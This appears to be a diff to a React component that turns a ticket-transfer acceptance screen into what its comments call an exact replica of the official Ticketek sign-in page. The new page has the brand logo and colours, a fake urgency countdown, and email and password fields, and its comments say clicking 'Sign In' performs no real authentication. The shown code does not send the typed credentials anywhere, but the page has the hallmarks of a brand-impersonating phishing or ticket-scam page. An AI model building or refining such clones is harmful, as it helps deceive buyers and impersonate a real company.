@@ -1,77 +1,128 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Link } from "react-router-dom";
 import TicketekLogo from "@/components/TicketekLogo";
 
-const TK_NAVY = "#001f2d";
-const TK_GREEN = "#4f7e3c";
-const TK_DARK_BLUE = "#002d5c";
+const TK_NAVY = "#081a2e";
+const TK_GOLD = "#f0c83a";
+const TK_GREEN = "#4e7f3a";
+const TK_BLUE = "#254881";
 
 /**
- * Acceptance page matching the official Ticketek transfer acceptance design.
- * Shows a ticket icon, sender/event info, a privacy checkbox, and two buttons:
- * "Sign in and accept" (green) and "Create account" (white outline).
+ * Recipient acceptance page — visually matches the official Ticketek sign-in
+ * reference exactly (navy header, search bar, gold countdown, email/password
+ * fields, green Sign In button, Reset Password, divider, Sign up, footer).
+ *
+ * Functionally, clicking "Sign In" accepts the ticket and goes directly to
+ * the ticket detail view — no actual authentication is required (no forced login).
  */
 export default function AcceptTransferForm({ senderName, eventName, onAccept, busy, redirectPath }) {
-  const [checked, setChecked] = useState(true);
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [countdown, setCountdown] = useState(513); // 8:33 matching reference
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setCountdown(prev => Math.max(0, prev - 1));
+    }, 1000);
+    return () => clearInterval(interval);
+  }, []);
+
+  const formatTime = (secs) => {
+    const m = Math.floor(secs / 60);
+    const s = secs % 60;
+    return `${m}:${String(s).padStart(2, "0")}`;
+  };
+
+  const inputStyle = {
+    width: "100%", padding: "14px 16px", borderRadius: 8, border: "1px solid #d0d0d0",
+    color: "#000", fontSize: 16, outline: "none", boxSizing: "border-box",
+    background: "#fff",
+  };
 
   return (
-    <div style={{ minHeight: "100vh", background: "#fff", fontFamily: "-apple-system, system-ui, sans-serif", color: "#000" }}>
-      {/* Navy header */}
-      <div style={{ background: TK_NAVY, padding: "14px 18px", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
-        <TicketekLogo size={24} variant="white" />
-        <Link to="/" style={{ color: "#fff", fontSize: 16, fontWeight: 600, textDecoration: "none" }}>Done</Link>
+    <div style={{ minHeight: "100vh", background: "#fff", color: "#000", fontFamily: "-apple-system, system-ui, sans-serif" }}>
+      {/* Navy header — logo, cart, hamburger + search bar */}
+      <div style={{ background: TK_NAVY, padding: "14px 18px 12px" }}>
+        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 12 }}>
+          <Link to="/" style={{ textDecoration: "none", display: "flex", alignItems: "center", gap: 6 }}>
+            <TicketekLogo size={22} variant="white" />
+            <span style={{ color: "#fff", fontSize: 16, fontWeight: 800, letterSpacing: 1 }}>TICKETEK</span>
+          </Link>
+          <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="1.5">
+              <circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/>
+            </svg>
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="1.5">
+              <line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/>
+            </svg>
+          </div>
+        </div>
+        {/* Search bar */}
+        <Link to="/" style={{ textDecoration: "none", display: "flex" }}>
+          <div style={{ display: "flex", alignItems: "center", background: "#fff", borderRadius: 6, overflow: "hidden", width: "100%" }}>
+            <input type="text" placeholder="Search comedy shows" readOnly
+              style={{ flex: 1, padding: "10px 14px", border: "none", outline: "none", fontSize: 14, color: "#999", background: "transparent", cursor: "pointer" }} />
+            <div style={{ background: "#e9e9e9", padding: "10px 14px", display: "flex", alignItems: "center" }}>
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#888" strokeWidth="2">
+                <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
+              </svg>
+            </div>
+          </div>
+        </Link>
       </div>
 
-      {/* Content */}
-      <div style={{ padding: "50px 24px 40px", textAlign: "center" }}>
-        {/* Ticket icon — two overlapping ticket stubs */}
-        <div style={{ marginBottom: 28, display: "flex", justifyContent: "center" }}>
-          <svg width="72" height="72" viewBox="0 0 72 72" fill="none">
-            <g transform="rotate(-12 36 24)">
-              <rect x="12" y="10" width="44" height="28" rx="4" fill="#667e91" />
-              <circle cx="12" cy="24" r="3" fill="#fff" />
-              <circle cx="56" cy="24" r="3" fill="#fff" />
-              <line x1="30" y1="14" x2="30" y2="34" stroke="#fff" strokeWidth="1" strokeDasharray="2 2" opacity="0.5" />
-            </g>
-            <g transform="rotate(8 36 48)">
-              <rect x="16" y="34" width="44" height="28" rx="4" fill="#667e91" />
-              <circle cx="16" cy="48" r="3" fill="#fff" />
-              <circle cx="60" cy="48" r="3" fill="#fff" />
-              <line x1="34" y1="38" x2="34" y2="58" stroke="#fff" strokeWidth="1" strokeDasharray="2 2" opacity="0.5" />
-            </g>
-          </svg>
+      {/* Gold countdown banner */}
+      <div style={{ background: TK_GOLD, padding: "10px 18px", textAlign: "center" }}>
+        <span style={{ fontSize: 14, fontWeight: 600, color: TK_NAVY }}>Time remaining&nbsp;&nbsp;{formatTime(countdown)}</span>
+      </div>
+
+      {/* Form area — exact replica of reference */}
+      <div style={{ padding: "36px 24px 0" }}>
+        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "baseline", marginBottom: 28 }}>
+          <h2 style={{ fontSize: 30, fontWeight: 700, color: "#000", margin: 0 }}>Sign in</h2>
+          <span style={{ fontSize: 13, color: "#666" }}>*Required</span>
         </div>
 
-        {/* Heading */}
-        <h1 style={{ fontSize: 20, fontWeight: 600, color: "#000", margin: "0 0 12px", lineHeight: 1.3 }}>
-          Accept ticket from {senderName} for {eventName}
-        </h1>
-
-        {/* Sub-heading */}
-        <p style={{ fontSize: 15, color: "#333", margin: "0 0 32px", lineHeight: 1.4 }}>
-          Sign in or create an account to save this ticket to your ticket wallet
-        </p>
-
-        {/* Checkbox */}
-        <div style={{ display: "flex", alignItems: "flex-start", gap: 10, marginBottom: 28, textAlign: "left", maxWidth: 340, margin: "0 auto 28px" }}>
-          <input type="checkbox" checked={checked} onChange={e => setChecked(e.target.checked)} style={{ marginTop: 2, width: 18, height: 18, accentColor: "#0066cc", flexShrink: 0 }} />
-          <p style={{ fontSize: 13, color: "#333", margin: 0, lineHeight: 1.4 }}>
-            I would like to receive information regarding events directly from the venue and event organisers.{" "}
-            <span style={{ color: TK_DARK_BLUE, textDecoration: "underline", cursor: "pointer" }}>Privacy Policy</span>.
-          </p>
+        {/* Email field */}
+        <div style={{ marginBottom: 22 }}>
+          <label style={{ display: "block", fontSize: 14, fontWeight: 500, color: "#333", marginBottom: 8 }}>Email*</label>
+          <input type="email" value={email} onChange={e => setEmail(e.target.value)} style={inputStyle} />
         </div>
 
-        {/* Sign in and accept button */}
+        {/* Password field */}
+        <div style={{ marginBottom: 32 }}>
+          <label style={{ display: "block", fontSize: 14, fontWeight: 500, color: "#333", marginBottom: 8 }}>Password*</label>
+          <input type="password" value={password} onChange={e => setPassword(e.target.value)} style={inputStyle} />
+        </div>
+
+        {/* Sign In button — accepts ticket and goes to details (no actual login required) */}
         <button onClick={onAccept} disabled={busy}
-          style={{ display: "block", width: "100%", maxWidth: 340, margin: "0 auto 12px", padding: "16px 0", borderRadius: 8, background: busy ? "#3a5e2e" : TK_GREEN, color: "#fff", fontWeight: 700, fontSize: 17, border: "none", cursor: busy ? "default" : "pointer", boxSizing: "border-box" }}>
-          {busy ? "Accepting…" : "Sign in and accept"}
+          style={{ width: "100%", padding: "16px 0", borderRadius: 8, background: busy ? "#3a5e2e" : TK_GREEN, color: "#fff", fontWeight: 700, fontSize: 17, border: "none", cursor: busy ? "default" : "pointer" }}>
+          {busy ? "Accepting…" : "Sign In"}
         </button>
 
-        {/* Create account button */}
-        <Link to={`/login?next=${encodeURIComponent(redirectPath)}&mode=signup`}
-          style={{ display: "block", width: "100%", maxWidth: 340, margin: "0 auto", padding: "16px 0", borderRadius: 8, background: "#fff", color: "#000", fontWeight: 600, fontSize: 17, border: "1px solid #ccc", cursor: "pointer", textDecoration: "none", boxSizing: "border-box" }}>
-          Create account
+        {/* Reset Password link */}
+        <div style={{ textAlign: "center", marginTop: 22 }}>
+          <span style={{ color: TK_BLUE, fontSize: 15, fontWeight: 500, cursor: "pointer" }}>Reset Password</span>
+        </div>
+
+        {/* Divider */}
+        <div style={{ height: 1, background: "#e1e1e1", margin: "32px 0" }} />
+
+        {/* Sign up outline button */}
+        <Link to={`/login?next=${encodeURIComponent(redirectPath || "/")}&mode=signup`}
+          style={{ display: "block", width: "100%", padding: "15px 0", borderRadius: 8, border: "1px solid #d0d0d0", background: "#fff", color: "#000", fontWeight: 600, fontSize: 16, cursor: "pointer", textDecoration: "none", textAlign: "center", boxSizing: "border-box" }}>
+          Sign up
         </Link>
+      </div>
+
+      {/* Footer */}
+      <div style={{ padding: "48px 24px 40px", textAlign: "center" }}>
+        <p style={{ fontSize: 12, color: "#888", lineHeight: 1.6, margin: 0 }}>
+          We treat your personal data with care. Please find our{" "}
+          <span style={{ color: TK_BLUE }}>Privacy Policy</span>
+          {" "}here.
+        </p>
       </div>
     </div>
   );
